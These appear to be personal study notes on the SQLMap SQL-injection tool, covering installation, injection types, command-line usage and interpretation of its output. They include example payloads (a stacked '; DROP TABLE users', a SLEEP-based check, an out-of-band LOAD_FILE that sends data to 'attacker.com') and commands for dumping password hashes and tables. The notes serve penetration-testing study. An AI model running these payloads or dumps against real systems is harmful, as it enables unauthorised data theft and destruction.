# SQLMap
- Free & Open Source
- Written in Python
- **Used for exploiting SQL Injection (SQLi) vulnerabilities**

## Installation
The easy way:
`$ sudo apt install sqlmap`

The hard[er] way:
```
$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Then run it
$ python sqlmap.py
```

## Supported Databases

| Database            | Database         | Database        | Database           |
|---------------------|------------------|-----------------|--------------------|
| MySQL               | Oracle           | PostgreSQL      | Microsoft SQL Server |
| SQLite              | IBM DB2          | Microsoft Access| Firebird           |
| Sybase              | SAP MaxDB        | Informix        | MariaDB            |
| HSQLDB              | CockroachDB      | TiDB            | MemSQL             |
| H2                  | MonetDB          | Apache Derby    | Amazon Redshift    |
| Vertica             | Mckoi            | Presto          | Altibase           |
| MimerSQL            | CrateDB          | Greenplum       | Drizzle            |
| Apache Ignite       | Cubrid           | InterSystems Cache | IRIS             |
| eXtremeDB           | FrontBase        |                 |                    |

## Heavily Supported Databases

| Database            | Database         | Database        | Database           | Database      |
|---------------------|------------------|-----------------|--------------------|---------------|
| MySQL               | PostgreSQL      | Oracle          | Microsoft SQL Server | Sybase       |
| Vertica             | IBM DB2         | Firebird        | MonetDB            |               |


### Get help
`$ sqlmap -h`

### Get MORE help (advanced version)
`$ sqlmap -hh`

## Types of SQL Injections

- The default is: `BEUSTQ`
  - B: Boolean-based blind
    - Ex. `AND 1=1`
    - Considered to be the most common type of SQLi vulnerability
  - E: Error-based
    - Ex. `AND GTID_SUBSET(@@version,0)`
    - Considered to be the fastest injection type, as it works by retrieving data in chunks
  - U: Union query-based
    - Ex. `UNION ALL SELECT 1,@@version,3`
    - Considered to be the fastest injection type
    - Ideally, we could get the entire database in one command
  - S: Stacked queries
    - Ex. `; DROP TABLE users`
    - Also known as "piggy backing"
    - "Stacking" must be supported by the database we are attacking
  - T: Time-based blind
    - Ex. `AND 1=IF(2>1,SLEEP(5),0)`
    - Considerably slower than Boolean-based blind SQL injection is not applicable
  - Q: Inline queries
    - Ex. `SELECT (SELECT @@version) from`
    - Works as an imbedded query within another query
    - Uncommon, as the website must be written in a certain way

- Advanced:
  - Out-of-band
    - Ex. `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`

# Usage

- To run a basic exploitation against a target, we can do: `$ sqlmap -u "https://<target>?<param>=1" --batch`

## Running SQLMap on an HTTP Request

### cURL
- It's not uncommon to mess up correct SQLi vulnerability detection through overcomplication or forgetting cookes
- We can simplify this process by:
  - Right-clicking on any given request in the Network (Monitor) panel in the Developer Tools
  - Clicking `Copy as cURL`
  - Replacing `curl` with `sqlmap`
- This may be seen as: `$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'`

#### GET/POST Requests
- `GET` parameters are privded with the usage of option `-u` / `--url`
- `POST` parameters are provided with the usage of option `--data`
  - Ex. `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`
  - In the above instance, `uid` and `name` will be tested for SQLi
  - If we are already confident, say `uid` was vulnerable, we could add `-p uid` or `*`
    - `sqlmap 'http://www.example.com/' --data 'uid=1&name=test' -p uid`
    - `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`

#### Full HTTP Requests
- If we need to use the full HTTP request, we can specify the `-r` flag, followed by the request
- We can find the request in `Burp`
  - Then, copy/paste this file into a file, and specify the file following the `-r` flag

Example HTTP Request (`req.txt`):
```
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

Then: `$ sqlmap -r req.txt`

#### Custom SQLMap Requests
- When running a custom SQLMap command, we will likely need a few switches
  - **Session Cookie**: We can specify the session cookie in a few ways
    - `$ sqlmap ... --cookie='PHPSESSID=<cookie>'`
    - `$ sqlmap ... -H='Cookie:'PHPSESSID=<cookie>'`
    - `$ sqlmap ... --header='Cookie:PHPSESSID=<cookie>'`
  - **Random Agent**: We can use the `--random-agent` switch to randomly select a user-agent header value
  - **Method**: We can specify the HTTP method (as there are many) with the `--method` switch
  - **We can SQLi exploit more than just parameters. We may also exploit any other header, such as cookies
    - `$ sqlmap ... --cookie='id=1*'`

#### Custom HTTP Requests
- It is good to note that we may not only structure HTTP requests as we normally do (eg. `id=1`), but we may also use JSON (eg. `{"id":1}`) and XML (eg. `<element><id>1</id></element>`)

## Handling SQLMap Errors

- Display Errors: `--parse-errors`
- Store the Traffic: `-t <output file`
- Verbose Output: `-v <level [eg. 6]>`
- Proxy: `--proxy` to redirect through a MiTM proxy, such as Burp

## Attack Tuning

- Every payload sent to the target consists of:
  - vector (eg, `UNION ALL SELECT 1,2,VERSION()`): central part of the payload, carrying the useful SQL code to be executed at the target.
  - boundaries (eg `'<vector>-- -`): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.
    - `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`

### Level/Risk
- `--level`: 1-5 (default: 1)
- `--risk`: 1-3 (default 1)

### Advanced Tuning
- **Status Codes**
-   `--code=<code>`
  - `200`: TRUE
  - `500`: FALSE
- **Titles**
-   `--titles <title>` compares title of HTML page (<title> tag)
- **Strings**
  - `--string=<string>`
    - `<string>` may be a value such as success or failure, or something totally different
- **Text-only**
  - `--text-only`: only shows visible content (eg. not <script>, <style>, <meta>, etc tags)
- **Techniques**
  - `technique=<technique>`
    Ex. `--technique=BEU` for Boolean-Based Blind, Error-Based, and UNION-query payloads
- **UNION SQLi Tuning**
  - `union-cols=<number_of_cols>`
    - Ex. `--union-cols=17` if we know the number of columns of the vulnerable SQL query
  - `--union-char='<character>'`
  - `--union-from=<table>`
 
## Database Enumeration

### SQLMap Data Exfiltration

- SQLMap has a predefined set of queries for all supported DBMSes
  - `--banner`: Database version banner
  - `--current-user`: Current user name
  - `--current-db`: Current database name
  - `--is-dba`: Checking if the current user has DBA (administrator) rights
  - `--passwords`: Password hashes
  - `--hostname`:  Hostname
  - Ex. `$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`
  - `--tables -D <database>`: Look at a tables in database <database>
  - `--dump -T <table> -D <database>`: Look at data in table <table> in database <database>
  - `--dump -T <table> -D <database> **-C <column>,<column2>**`: Only show certain columns
  - `--dump -T <table> -D <database> **--start=2 --stop=3**`: Specify start and stop rows (inclusive)
  - `--dump -T <table> -D <database> **--where="<condition>"**`: Get content of table based on WHERE condition
  - `--dump -D <database> --exclude-sysdbs`: Exclude system databases
  
**Advanced Commands**
- `--schema`: Retrieve the structure of all tables
- `--search <query>`: Search for databases, tables, and columns of interest
  - Ex. `--search -T user`: Search tables containing `user` keyword
- 



# Understanding the output

- Common messages you may receive include:
  - **URL content is stable**: `target URL content is stable`
    - No major changes between responses in case of continuous identical requests
  - **Parameter appears to be dynamic**: `GET parameter '<param>' appears to be dynamic`
    - A "dynamic" parameter is one that would result in a change in response
      - This is desirable (as it is easy to determine
      - The parameter may be linked to a database
      - If the parameter is static, it may be an indicator the vvalue of the tested parameter is nont processed by the target
  - **Parameter might be vulnerable to XSS attacks**: `heuristic (XSS) test shows that GET parameter '<parameter>' might be vulnerable to cross-site scripting (XSS)`
    - This is an example of a DMBS error
    - Good indication of potential SQLi
    - SQLMap sent an intentionally invalid value (eg. ?<parameter>=1",)..).))')
    - **Not proof of SQLi**
  - **Back-end DBMS is '...'**: `it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]`
    - SQLMap normally tests for all supported DBMSes
    - If there is a clear DBMS in use, we can narrow down payloads to that specific DBMS
  - **Level/risk values**: `for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]`
    - May extend specific tests for a DBMS beyond regular tests, assuming we clearly understand the target's DBMS
  - **Reflective values found**: `reflective value(s) found and filtering out`
    - Simply a warning that parts of the used payloads are found in the response
      - May cause problems to automation tools, as it represents junk
      - However, SQLMap filters out such junk before comparing the original page content (most of the time)
  - **Parameter appears to be injectable**: `GET parameter '<parameter>' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")`
    - Indicates the parameter is injectable
      - May be a false-positive
        - SQLMap performs extensive testing consisting of simple logic checks for removal of false-positive findings to check for this
    - `with --string="luther"`: indicates SQLMap recognized and user the papearance of constant string value `luther` in the response for distinguishing `TRUE` from `FALSE` responses
      - Important as, in such cases, there is no need for the usage of advacned internal mechanisms, such as dynamicity/reflection or fuzzy comparison of responses, which cannot be considered as false-positive
  - **Time-based comparison statistical model**: `time-based comparison requires a larger statistical model, please wait........... (done)`
      - SQLMap uses a statistical model for the recognition of regular and (deliberately) delayed target responses
      - For this model to work, there is a requirement to collect a sufficient number of regular response times
        - This way, SQLMap can statistically distinguish between the deliberate delay even in the high-latency network environments
  - **Extending UNION query injection technique tests**: `automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found`
    - UNION-query SQLi checks require considerably more requests for successful recognition of usable payload than other SQLi types
    - To lower the testing time per parameter, especially if the target does not appear to be injectable, the number of requests is capped to a constant value
    - If there is a good chance the target is vulnerable, especially as one other (potential) SQLi technique is found, SQLMap extends the default number of requests for UNION query SQLi, because of a higher expectancy of success
  - **Technique appears to be usable**: `ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test`
    - `ORDER BY` is checked for usability
  - **Parameter is vulnerable**: `GET parameter '<target>' is vulnerable. Do you want to keep testing the others (if any)? [y/N]`
    - **One of the most important messages of SQLMap**
    - Means the parameter was found to be vulnerable to SQL injections
    - We may stop here, or continue on to find more vulnerabilities
  - **SQLMap identified injection points**: `sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:`
    - A lsit of all injection points with type, title, and payloads follows
      - Final proof of successful detection and exploitation of found SQLi vulnerabilities
      - SQLMap only lists those findings which are provably exploitable (ie. usable)
  - **Data logged to text files=**: `fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com`
    - Indicates the local file system location used for storing logs, sessions, output data, etc (of a target)
    - SQLMap attempts to reduce the required target requests as much as possible, depending on the session files' data








